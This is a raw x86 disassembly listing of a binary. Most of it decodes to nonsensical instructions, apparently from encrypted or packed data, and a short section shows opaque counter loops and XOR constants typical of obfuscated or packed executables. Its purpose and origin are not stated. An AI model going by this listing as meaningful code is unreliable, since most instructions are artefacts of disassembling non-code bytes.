  408bb2:	mov    dl,cl
  408bb4:	leave  
  408bb5:	or     eax,0x7defdca8
  408bba:	sbb    ch,bl
  408bbc:	dec    esp
  408bbd:	shr    BYTE PTR [edi-0x7],1
  408bc0:	mov    ebx,0xdad5303e
  408bc5:	je     0x408c45
  408bc7:	dec    ebp
  408bc8:	xor    DWORD PTR [edi],eax
  408bca:	mov    al,ds:0xd278b30e
  408bcf:	mov    cl,BYTE PTR [eax-0x7c]
  408bd2:	xchg   esp,eax
  408bd3:	rcr    BYTE PTR [ecx+0x51],1
  408bd6:	minps  xmm2,XMMWORD PTR [ebp+0x35]
  408bda:	leave  
  408bdb:	pop    edi
  408bdc:	ret    
  408bdd:	jmp    0xb9ad:0x5a38039e
  408be4:	jg     0x408bc1
  408be6:	xlat   BYTE PTR ds:[ebx]
  408be7:	pop    edx
  408be8:	loop   0x408c2c
  408bea:	out    0x4f,eax
  408bec:	hlt    
  408bed:	inc    edi
  408bee:	fld    DWORD PTR [ecx]
  408bf0:	mov    dh,0x94
  408bf2:	lods   al,BYTE PTR ds:[esi]
  408bf3:	ret    0x59d
  408bf6:	xchg   esp,eax
  408bf7:	fcomp  DWORD PTR [edi+0x3a8bf94a]
  408bfd:	mov    ds:0xc74a1eb5,al
  408c02:	cmp    BYTE PTR [esi-0x54],bl
  408c05:	push   ebx
  408c06:	lahf   
  408c07:	mov    esp,0x69c9cc7e
  408c0c:	xchg   esi,eax
  408c0d:	cmp    al,0x69
  408c0f:	loopne 0x408c36
  408c11:	imul   edi,DWORD PTR [ecx-0x48312713],0x70743fab
  408c1b:	jo     0x408bbb
  408c1d:	(bad)  
  408c1f:	mov    ebp,0x226c026a
  408c24:	in     al,dx
  408c25:	les    edi,FWORD PTR [eax-0x2a6a93bf]
  408c2b:	icebp  
  408c2c:	int3   
  408c2d:	(bad)  
  408c2e:	out    0x5f,eax
  408c30:	xchg   edx,eax
  408c31:	cmp    eax,0xe8f940c6
  408c36:	mov    gs,ebp
  408c38:	ret    
  408c39:	mov    al,0x53
  408c3b:	ins    BYTE PTR es:[edi],dx
  408c3c:	xor    dl,cl
  408c3e:	pop    ss
  408c3f:	or     esi,ebx
  408c41:	xor    esi,DWORD PTR [ebp-0x34]
  408c44:	cli    
  408c45:	cld    
  408c46:	push   DWORD PTR [edx-0x7e]
  408c49:	lds    ecx,FWORD PTR [esp+ebx*1]
  408c4c:	fimul  DWORD PTR [edi]
  408c4e:	jne    0x408c50
  408c50:	aaa    
  408c51:	nop
  408c52:	sar    DWORD PTR ds:0x3d5a79f,1
  408c58:	jmp    0x8ceded8e
  408c5d:	in     eax,0xfc
  408c5f:	or     BYTE PTR ds:[edi+0x18],cl
  408c63:	push   0xc0a48757
  408c68:	jmp    0x408cdf
  408c6a:	mov    ch,0xdb
  408c6c:	cdq    
  408c6d:	jge    0x408c16
  408c6f:	popa   
  408c70:	imul   ebx,eax,0xffffffdf
  408c73:	sbb    al,0x38
  408c75:	cmp    BYTE PTR [eax+0x769804e9],bl
  408c7b:	jbe    0x408c78
  408c7d:	jmp    0x408c47
  408c7f:	test   BYTE PTR [eax-0x4e4ed2a6],dh
  408c85:	repz pop ebx
  408c87:	jp     0x408cc2
  408c89:	sbb    al,0x2d
  408c8b:	mov    eax,ds
  408c8d:	cli    
  408c8e:	dec    ecx
  408c8f:	dec    ebx
  408c90:	add    edx,esi
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	sbb    edx,0xdc1419d8
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	test   DWORD PTR [eax-0x35],ebp
  408cc5:	inc    eax
  408cc6:	dec    BYTE PTR [edx-0x183b97fd]
  408ccc:	std    
  408ccd:	test   BYTE PTR [esi+0x5c],0x64
  408cd1:	test   esi,0x9b4f35ce
  408cd7:	fistp  WORD PTR gs:[ebx+0x339c259b]
  408cde:	push   eax
  408cdf:	mov    eax,ds:0xbeebb57b
  408ce4:	sub    BYTE PTR [edi-0x7b],0x61
  408ce8:	xor    DWORD PTR [edx-0x6d5bf6c9],0x9506c020
  408cf2:	cdq    
  408cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cf4:	pushf  
  408cf5:	out    0xf1,eax
  408cf7:	in     eax,0xf4
  408cf9:	mov    eax,0xe8915df1
  408cfe:	dec    ebx
  408cff:	jmp    0x3f11:0x25a20a0e
  408d06:	gs push ecx
  408d08:	es push eax
  408d0a:	loop   0x408d0d
  408d0c:	leave  
  408d0d:	es clc 
  408d0f:	jp     0x408d80
  408d11:	push   0x48de45d7
  408d16:	daa    
  408d17:	jecxz  0x408cd2
  408d19:	or     eax,0x5d136769
  408d1e:	rcl    bl,cl
  408d20:	sub    al,0xbe
  408d22:	jo     0x408cda
  408d24:	sbb    edx,DWORD PTR [ecx]
  408d26:	xor    al,0x4a
  408d28:	inc    eax
  408d29:	out    0x21,eax
  408d2b:	inc    esp
  408d2c:	adc    eax,0xd4a885b2
  408d31:	inc    esi
  408d32:	mov    esi,0x65f415bc
  408d37:	idiv   BYTE PTR [esi-0x188254cb]
  408d3d:	mov    al,ds:0x6ca38213
  408d42:	adc    al,0xff
  408d44:	lods   eax,DWORD PTR ds:[esi]
  408d45:	stc    
  408d46:	std    
  408d47:	xor    ebx,0xea91c999
  408d4d:	stc    
  408d4e:	mov    ebp,0xb9dd9a82
  408d53:	scas   al,BYTE PTR es:[edi]
  408d54:	xor    ebp,esp
  408d56:	xor    esp,DWORD PTR [ebx+0x76d7b7ea]
  408d5c:	les    ebp,FWORD PTR [edx+0x68a1f713]
  408d62:	pop    esp
  408d63:	adc    DWORD PTR fs:0x6950f193,edx
  408d6a:	cdq    
  408d6b:	lock popf 
  408d6d:	ficomp DWORD PTR [edx+0xbff9333]
  408d73:	scas   al,BYTE PTR es:[edi]
  408d74:	sti    
  408d75:	retf   
  408d76:	sbb    al,0x7c
  408d78:	shr    DWORD PTR [ecx+0x17],1
  408d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d7c:	aad    0xce
  408d7e:	mov    ds:0xf4317edf,eax
  408d83:	shl    BYTE PTR [ecx],1
  408d85:	(bad)  
  408d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d87:	mov    ds:0xe4ff01fd,eax
  408d8c:	xlat   BYTE PTR ds:[ebx]
  408d8d:	mul    DWORD PTR [edi-0x23]
  408d90:	pop    ecx
  408d91:	mov    ecx,0x3ce04252
  408d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d97:	sub    esi,DWORD PTR [edi-0x6c799c2c]
  408d9d:	xor    eax,0xe4326c5e
  408da2:	xchg   DWORD PTR [esp+eax*8+0x7f153ce9],edi
  408da9:	jge    0x408d59
  408dab:	pop    esp
  408dac:	xchg   ebp,eax
  408dad:	fdivr  st,st(6)
  408daf:	icebp  
  408db0:	pop    ds
  408db1:	mov    al,ds:0x51c65638
  408db6:	sbb    BYTE PTR [edx],ch
  408db8:	mov    eax,eax
  408dba:	cdq    
  408dbb:	jmp    0x41277dad
  408dc0:	cwde   
  408dc1:	es scas al,BYTE PTR es:[edi]
  408dc3:	mov    cl,0x97
  408dc5:	and    al,0xcf
  408dc7:	sbb    DWORD PTR [ebx-0x7c282df4],ebx
  408dcd:	ftst   
  408dcf:	ret    
  408dd0:	gs test al,0xe1
  408dd3:	mov    bl,0xd8
  408dd5:	(bad)  
  408dd6:	dec    ebx
  408dd7:	mov    bl,0x55
  408dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dda:	sbb    al,0x31
  408ddc:	xor    esp,DWORD PTR [ecx+ecx*4+0x76b65810]
  408de3:	jns    0x408dbe
  408de5:	cld    
  408de6:	je     0x408e54
  408de8:	pusha  
  408de9:	sbb    DWORD PTR [ecx-0x6b],esi
  408dec:	pop    ds
  408ded:	iret   
  408dee:	cmp    ch,al
  408df0:	out    0x87,eax
  408df2:	rcl    dl,1
  408df4:	mov    al,0x2c
  408df6:	sub    DWORD PTR [esi],ecx
  408df8:	cmp    ebx,DWORD PTR [ebp-0x20386640]
  408dfe:	xlat   BYTE PTR ds:[ebx]
  408dff:	pop    ss
  408e00:	cmp    eax,0xd22c3d4f
  408e05:	mov    ecx,0x15e9437
  408e0a:	adc    al,0x53
  408e0c:	mov    ecx,0xa9a68045
  408e11:	jmp    0x31b2:0xd99f810d
  408e18:	ret    
  408e19:	call   0xdfe0:0x596807cf
  408e20:	inc    edi
  408e21:	push   esi
  408e22:	sub    al,BYTE PTR [esi+0x188cb119]
  408e28:	add    eax,0x331c8d3d
  408e2d:	ret    0x5b3d
  408e30:	or     al,0xa8
  408e32:	jp     0x408e43
  408e34:	test   BYTE PTR [ecx-0x9],dl
  408e37:	(bad)  
  408e38:	dec    DWORD PTR [ebx+0x81f045]
  408e3e:	add    DWORD PTR ds:0x43e90740,esi
  408e44:	idiv   edi
  408e46:	dec    DWORD PTR [ebx-0x7d161bbb]
  408e4c:	add    DWORD PTR [eax],eax
  408e4e:	add    BYTE PTR ds:0xa417048d,dh
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0x8f9d218f
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	xchg   ebp,eax
  408e68:	and    al,0x15
  408e6a:	adc    DWORD PTR ds:0xdfad2ddc,edx
  408e70:	daa    
  408e71:	jb     0x408e39
  408e73:	dec    ebp
  408e74:	cld    
  408e75:	div    BYTE PTR [esi]
  408e77:	mov    dl,0xc6
  408e79:	popa   
  408e7a:	pop    esi
  408e7b:	cmp    al,ch
  408e7d:	fst    DWORD PTR [edi+0x74]
  408e80:	ins    BYTE PTR es:[edi],dx
  408e81:	test   eax,0xfc4761d7
  408e86:	gs pop ecx
  408e88:	loopne 0x408e73
  408e8a:	pop    ds
  408e8b:	xchg   ebp,eax
  408e8c:	mov    WORD PTR [ebx-0x1d],ss
  408e8f:	ss (bad) 
  408e91:	add    edi,DWORD PTR [ebx-0x5b]
  408e94:	sbb    edx,DWORD PTR [eax+0x1c]
  408e97:	outs   dx,BYTE PTR ds:[esi]
  408e98:	xchg   ebp,eax
  408e99:	dec    ebp
  408e9a:	mov    esp,0x276fc8b7
  408e9f:	inc    edx
  408ea0:	xchg   DWORD PTR [eax],edi
  408ea2:	icebp  
  408ea3:	stos   BYTE PTR es:[edi],al
  408ea4:	pop    eax
  408ea5:	add    dh,BYTE PTR [edi-0x4c077d0d]
  408eab:	inc    eax
  408eac:	sbb    al,0xd3
  408eae:	shl    DWORD PTR [ebx],1
  408eb0:	push   esi
  408eb1:	ror    DWORD PTR [ebx-0x39],0xfd
  408eb5:	mov    esi,0x2bb88705
  408eba:	cmp    edx,0x254a8190
  408ec0:	or     eax,ebp
  408ec2:	push   ebx
  408ec3:	xchg   DWORD PTR [ebx+0x5],ecx
  408ec6:	dec    esi
  408ec7:	inc    edi
  408ec8:	dec    esi
  408ec9:	das    
  408eca:	ret    0xa213
  408ecd:	(bad)  
  408ece:	ins    DWORD PTR es:[edi],dx
  408ecf:	adc    ah,al
  408ed1:	dec    edi
  408ed2:	mov    DWORD PTR [edi-0x40618d52],ebp
  408ed8:	fsub   st(2),st
  408eda:	adc    dh,BYTE PTR ds:0x8ec79626
  408ee0:	xchg   ecx,eax
  408ee1:	and    DWORD PTR [ebx],esi
  408ee3:	repnz les ebp,FWORD PTR [eax+eax*2-0x4c]
  408ee8:	(bad)  
  408ee9:	jo     0x408f49
  408eeb:	pop    ds
  408eec:	fild   QWORD PTR [ebp+0x62e9fdb2]
  408ef2:	mov    ch,0x2
  408ef4:	or     bh,BYTE PTR [ecx]
  408ef6:	mov    ebp,0xd00c5665
  408efb:	jmp    0xd31eeb2
  408f00:	pop    ebp
  408f01:	fstp   TBYTE PTR [eax-0x35]
  408f04:	xchg   ebp,eax
  408f05:	xchg   BYTE PTR [eax-0x1538e680],ch
  408f0b:	mov    ebp,0x5bb99bdb
  408f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f11:	mov    cl,0x2e
  408f13:	add    BYTE PTR [esp+edi*4+0x7a],dl
  408f17:	jo     0x408f32
  408f19:	aad    0x9c
  408f1b:	mov    ch,0xd7
  408f1d:	scas   eax,DWORD PTR es:[edi]
  408f1e:	push   edx
  408f1f:	fldcw  WORD PTR [ebx+ecx*2+0x3a17959e]
  408f26:	dec    ebp
  408f27:	gs in  eax,0xa7
  408f2a:	fisub  DWORD PTR [edi]
  408f2c:	out    0x4e,al
  408f2e:	dec    esp
  408f2f:	sub    eax,0xe59cb429
  408f34:	lods   al,BYTE PTR ds:[esi]
  408f35:	xor    BYTE PTR [edi-0x15],bl
  408f38:	add    DWORD PTR [ecx+eiz*2-0x62679429],edi
  408f3f:	xchg   esi,eax
  408f40:	pop    edi
  408f41:	out    0x31,eax
  408f43:	enter  0xccd3,0xda
  408f47:	xor    edx,DWORD PTR [ebp+0x62]
  408f4a:	push   0x867ff150
  408f4f:	lds    eax,FWORD PTR [ebx+0x60f289e3]
  408f55:	add    eax,0x3c07a24
  408f5a:	inc    esp
  408f5b:	ja     0x408f8e
  408f5d:	push   esi
  408f5e:	icebp  
  408f5f:	pop    ebp
  408f60:	cwde   
  408f61:	stos   DWORD PTR es:[edi],eax
  408f62:	jns    0x408f55
  408f64:	and    edx,DWORD PTR [edi]
  408f66:	call   0x94c6:0x6b1ef04f
  408f6d:	cli    
  408f6e:	ds push esi
  408f70:	jge    0x408f27
  408f72:	jnp    0x408f74
  408f74:	dec    eax
  408f75:	mov    eax,ds:0x9cb8f54f
  408f7a:	sub    dh,BYTE PTR [edx+0x4d]
  408f7d:	mov    ss,WORD PTR [esi+0x7d]
  408f80:	fisttp DWORD PTR [esi]
  408f82:	mov    edx,0x101ef33e
  408f87:	xchg   ebx,eax
  408f88:	outs   dx,DWORD PTR ds:[esi]
  408f89:	cmp    eax,0xa6e20fe
  408f8e:	out    dx,eax
  408f8f:	xor    al,0xbc
  408f91:	and    eax,0x9c9b0d7d
  408f96:	mov    edi,0x24e985c6
  408f9b:	add    BYTE PTR [ebp+0x2f5f4d1b],ch
  408fa1:	jbe    0x40901c
  408fa3:	icebp  
  408fa4:	mul    BYTE PTR [edi]
  408fa6:	inc    edx
  408fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa8:	out    dx,eax
  408fa9:	das    
  408faa:	adc    DWORD PTR [eax],edi
  408fac:	sti    
  408fad:	pop    esp
  408fae:	outs   dx,BYTE PTR ds:[esi]
  408faf:	xchg   edi,eax
  408fb0:	mov    eax,ds:0x27158f64
  408fb5:	test   eax,0x19920b42
  408fba:	fistp  DWORD PTR ds:0x4f411049
  408fc0:	imul   edx,DWORD PTR [ebx+0x6b],0x36283a62
  408fc7:	iret   
  408fc8:	retf   
  408fc9:	shr    DWORD PTR [ecx],0x6f
  408fcc:	jno    0x409031
  408fce:	push   ds
  408fcf:	aaa    
  408fd0:	xor    al,0x39
  408fd2:	cmp    BYTE PTR [edi],cl
  408fd4:	test   BYTE PTR [ecx-0x4700000b],dh
  408fda:	call   0xf8fe:0xe9800f1c
  408fe1:	(bad)  
  408fe2:	call   DWORD PTR [ebp-0x75]
  408fe5:	in     al,dx
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4336af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4336af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4336af,ecx
  40900c:	cmp    DWORD PTR ds:0x4336af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4336af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4336eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4336eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4336eb,ecx
  409060:	cmp    DWORD PTR ds:0x4336eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43372f
  409072:	push   0x494f
  409077:	push   0x43379a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4336eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4336f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433703,0x43373b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433677,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4336c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4336db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4336a7,0x43362f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433627
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43373b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433613,0x17
  40910c:	cmp    DWORD PTR ds:0x433613,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433613,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433613
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433613,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4336a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	pop    ss
  409165:	(bad)  
  409166:	dec    ebx
  409167:	and    BYTE PTR [eax-0x26],0x7e
  40916b:	jle    0x4091e7
  40916d:	jge    0x4091ed
  40916f:	jle    0x40912a
  409171:	out    0x8f,eax
  409173:	mov    ch,0x7a
  409175:	jbe    0x4091c2
  409177:	pop    esp
  409178:	ins    DWORD PTR es:[edi],dx
  409179:	adc    al,0x24
  40917b:	adc    DWORD PTR [edi-0x35],edx
  40917e:	inc    eax
  40917f:	push   ds
  409180:	mov    fs,edi
  409182:	jg     0x4091a7
  409184:	stc    
  409185:	arpl   WORD PTR [edi+0x6ddc16d2],ax
  40918b:	pop    es
  40918c:	jge    0x4091b1
  40918e:	pushf  
  40918f:	fst    DWORD PTR [ebp-0x66]
  409192:	push   esi
  409193:	sar    dh,0xa5
  409196:	(bad)  
  409198:	les    ebx,FWORD PTR [esi+0x5c]
  40919b:	mov    dl,0x15
  40919d:	push   esp
  40919e:	lahf   
  40919f:	cmp    ebp,DWORD PTR [ebp+0x5e]
  4091a2:	or     ah,BYTE PTR [eax-0x6b]
  4091a5:	aaa    
  4091a6:	shl    BYTE PTR [esi-0x61fac869],1
  4091ac:	xchg   ecx,eax
  4091ad:	sahf   
  4091ae:	mov    ecx,0xfd07bce9
  4091b3:	pushf  
  4091b4:	jecxz  0x409170
  4091b6:	inc    ebp
  4091b7:	pop    es
  4091b8:	mov    dh,BYTE PTR [esi+0x2b]
  4091bb:	add    ebp,DWORD PTR [ebx+0x7d]
  4091be:	xchg   BYTE PTR ds:0xe5870e67,dl
  4091c4:	iret   
  4091c5:	jl     0x409183
  4091c7:	push   es
  4091c8:	push   0xb75da7ec
  4091cd:	enter  0x74da,0xa8
  4091d1:	int    0xe0
  4091d3:	(bad)  
  4091d4:	lock mov WORD PTR [esp+eax*8-0x7b],fs
  4091d9:	stos   DWORD PTR es:[edi],eax
  4091da:	ret    0xad97
  4091dd:	mov    ah,0xf5
  4091df:	hlt    
  4091e0:	and    DWORD PTR [edx+0xe2a3165],0xffffffd3
  4091e7:	jo     0x409178
  4091e9:	cmc    
  4091ea:	dec    esi
  4091eb:	jecxz  0x409208
  4091ed:	(bad)  
  4091ee:	mov    dl,0x1
  4091f0:	sbb    al,0x4d
  4091f2:	pop    ecx
  4091f3:	call   0x6240:0x1c27a299
  4091fa:	in     eax,0xd9
  4091fc:	cmp    cl,cl
  4091fe:	jae    0x409228
  409200:	jb     0x40924b
  409202:	xchg   ebx,eax
  409203:	pop    edx
  409204:	je     0x409250
  409206:	mov    eax,0xa7faecd3
  40920b:	ds pop ss
  40920d:	jne    0x409269
  40920f:	imul   eax,ecx,0xd4e00a17
  409215:	dec    edx
  409216:	(bad)  
  409217:	stos   DWORD PTR es:[edi],eax
  409218:	(bad)  
  409219:	retf   0xcc26
  40921c:	fadd   DWORD PTR [edx-0x46512019]
  409222:	pop    es
  409223:	ret    
  409224:	(bad)  
  409225:	int3   
  409226:	mov    ah,0x6f
  409228:	pop    edi
  409229:	arpl   WORD PTR [edi-0x549bd55f],cx
  40922f:	adc    esi,DWORD PTR [edi+0x61]
  409232:	test   al,0x25
  409234:	adc    eax,0x8a80aee4
  409239:	sub    DWORD PTR [esi],esi
  40923b:	add    al,0x39
  40923d:	shl    BYTE PTR [esi],0x7f
  409240:	mov    ah,0x8c
  409242:	mov    edx,es
  409244:	pop    ebx
  409245:	cmp    eax,0x6dee4f45
  40924a:	shr    DWORD PTR [edx],cl
  40924c:	mov    edx,0x34edefee
  409251:	aam    0x63
  409253:	ds pop eax
  409255:	adc    al,BYTE PTR [eax]
  409257:	ss inc esi
  409259:	sub    bl,BYTE PTR [esi-0x53]
  40925c:	jne    0x40925b
  40925e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40925f:	adc    DWORD PTR [edi+0x1e],edx
  409262:	inc    eax
  409263:	(bad)  
  409264:	bsf    ecx,DWORD PTR [ebx-0x752eebfa]
  40926b:	retf   
  40926c:	adc    eax,0xb2fdf51b
  409271:	mov    ch,0x24
  409273:	call   0xc082:0x664eef84
  40927a:	(bad)  
  40927b:	pop    ecx
  40927c:	or     BYTE PTR [esi],0x59
  40927f:	mov    esp,esp
  409281:	mov    esp,0x686cfc4d
  409286:	sbb    dh,dh
  409288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409289:	ret    
  40928a:	sbb    eax,edi
  40928c:	mov    es,WORD PTR [ebp-0x3736727d]
  409292:	in     eax,dx
  409293:	inc    ecx
  409294:	cmp    eax,0xfa6b726b
  409299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40929a:	scas   eax,DWORD PTR es:[edi]
  40929b:	je     0x4092bd
  40929d:	or     eax,esi
  40929f:	xlat   BYTE PTR ds:[ebx]
  4092a0:	lahf   
  4092a1:	mov    edx,0x2361d4d4
  4092a6:	test   DWORD PTR [eiz*2+0x15e11421],edi
  4092ad:	imul   edi,DWORD PTR [edi+0x2ddd03f0],0xee7e0908
  4092b7:	in     eax,0xb1
  4092b9:	jp     0x40929f
  4092bb:	adc    esp,edi
  4092bd:	sub    dh,al
  4092bf:	repz sbb al,0xaa
  4092c2:	and    ebp,0x20d3327c
  4092c8:	jg     0x409336
  4092ca:	out    dx,al
  4092cb:	in     al,dx
  4092cc:	mul    DWORD PTR [ebp+0x50]
  4092cf:	aaa    
  4092d0:	sub    ebp,ecx
  4092d2:	xor    esi,DWORD PTR [edi+0xa2617cd]
  4092d8:	lock adc BYTE PTR [ebp-0x32],ch
  4092dc:	xlat   BYTE PTR ds:[ebx]
  4092dd:	retf   
  4092de:	push   0x8a1ac3ce
  4092e3:	xor    ebp,DWORD PTR es:[ecx-0x39]
  4092e7:	cwde   
  4092e8:	scas   eax,DWORD PTR es:[edi]
  4092e9:	(bad)  
  4092ea:	push   es
  4092eb:	inc    esp
  4092ec:	cdq    
  4092ed:	jp     0x409295
  4092ef:	xchg   ebp,eax
  4092f0:	jne    0x409295
  4092f2:	push   cs
  4092f3:	lods   eax,DWORD PTR ds:[esi]
  4092f4:	push   edi
  4092f5:	(bad)  
  4092f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f8:	aaa    
  4092f9:	pop    esp
  4092fa:	cmp    cl,cl
  4092fc:	xchg   edi,eax
  4092fd:	adc    DWORD PTR [edx+0x3d],esp
  409300:	sahf   
  409301:	mov    dl,0xeb
  409303:	lods   eax,DWORD PTR ds:[esi]
  409304:	(bad)  
  409305:	data16 mov ds:0x797c2e27,al
  40930b:	popa   
  40930c:	sbb    BYTE PTR [ebx-0x10],bl
  40930f:	imul   ebp,DWORD PTR [edi],0xffffffe6
  409312:	in     eax,dx
  409313:	push   ecx
  409314:	scas   eax,DWORD PTR es:[edi]
  409315:	mov    dh,0x3e
  409317:	cmp    DWORD PTR [edi-0x7b],ebx
  40931a:	pushf  
  40931b:	or     esi,DWORD PTR [ecx-0x7a]
  40931e:	and    ah,ah
  409320:	lahf   
  409321:	mov    eax,0x26bfefc1
  409326:	aad    0x11
  409328:	adc    edx,ebx
  40932a:	sahf   
  40932b:	inc    eax
  40932c:	js     0x409377
  40932e:	imul   edx,DWORD PTR [esi+ebx*2+0x7e],0xffffffe4
  409333:	mov    bl,0x8c
  409335:	hlt    
  409336:	repnz (bad) [edi-0x29c17ae3]
  40933d:	dec    eax
  40933e:	stc    
  40933f:	js     0x40930a
  409341:	(bad)  
  409342:	sar    edi,1
  409344:	not    BYTE PTR [edx-0x59aa7fa9]
  40934a:	mov    al,ds:0x2e8780e5
  40934f:	push   0x2c81e5f3
  409354:	sub    ecx,DWORD PTR [edi]
  409356:	adc    eax,0xa354f730
  40935b:	push   ecx
  40935c:	push   edx
  40935d:	out    dx,al
  40935e:	sbb    BYTE PTR [esi-0x6c],dl
  409361:	xor    eax,0x911dbc5c
  409366:	mov    WORD PTR ds:0x3d37707e,dx
  40936d:	dec    ebp
  40936e:	pop    eax
  40936f:	inc    edi
  409370:	lea    eax,[edi+eiz*4]
  409373:	and    eax,0x633c2fd3
  409378:	jle    0x4093f3
  40937a:	outs   dx,BYTE PTR ds:[esi]
  40937b:	fisub  DWORD PTR [edx+0x5b]
  40937e:	daa    
  40937f:	ja     0x4093b6
  409381:	fst    QWORD PTR [eax-0x35]
  409384:	out    0x27,al
  409386:	cli    
  409387:	ins    BYTE PTR es:[edi],dx
  409388:	lds    esi,FWORD PTR cs:[esi+0x4b]
  40938c:	mov    WORD PTR [ebx-0x76fde9b],es
  409392:	cmc    
  409393:	sbb    eax,DWORD PTR [ecx-0x72]
  409396:	or     DWORD PTR cs:[edi-0x48],esp
  40939a:	lods   al,BYTE PTR ds:[esi]
  40939b:	and    eax,0x6bb88540
  4093a0:	fadd   DWORD PTR [edi-0x229340ab]
  4093a6:	ret    
  4093a7:	call   0xfe45cb7f
  4093ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ad:	and    BYTE PTR [ecx-0x2cab967],0x73
  4093b4:	push   0xc9bffc06
  4093b9:	xchg   BYTE PTR [eax+0x411860aa],dh
  4093bf:	pushf  
  4093c0:	popf   
  4093c1:	stc    
  4093c2:	scas   al,BYTE PTR es:[edi]
  4093c3:	js     0x4093b5
  4093c5:	xor    BYTE PTR [ebx+esi*1+0x24],bh
  4093c9:	outs   dx,BYTE PTR ds:[esi]
  4093ca:	pop    ebx
  4093cb:	outs   dx,DWORD PTR ds:[esi]
  4093cc:	or     al,0xc7
  4093ce:	and    cl,ch
  4093d0:	mov    al,ds:0x2e66de90
  4093d5:	or     edx,eax
  4093d7:	jo     0x4093bc
  4093d9:	push   0x6f24fb1d
  4093de:	cli    
  4093df:	sti    
  4093e0:	sets   al
  4093e3:	stos   BYTE PTR es:[edi],al
  4093e4:	(bad)  
  4093e5:	ins    BYTE PTR es:[edi],dx
  4093e6:	(bad)  
  4093e7:	imul   edi,DWORD PTR [ebx-0x2a],0x27031861
  4093ee:	mov    edx,0xd0fb6b61
  4093f3:	pop    ds
  4093f4:	inc    eax
  4093f6:	add    edi,ebx
  4093f8:	cmc    
  4093f9:	aas    
  4093fa:	out    0x8a,eax
  4093fc:	outs   dx,DWORD PTR ss:[esi]
  4093fe:	fimul  DWORD PTR [ebx]
  409400:	faddp  st(6),st
  409402:	adc    DWORD PTR [edi-0x5fbad3ae],edx
  409408:	xchg   ah,bh
  40940a:	adc    eax,0x704f9fef
  40940f:	xor    ebp,ecx
  409411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409412:	enter  0x530c,0x49
  409416:	sub    al,0xe6
  409418:	or     edi,esi
  40941a:	pop    edx
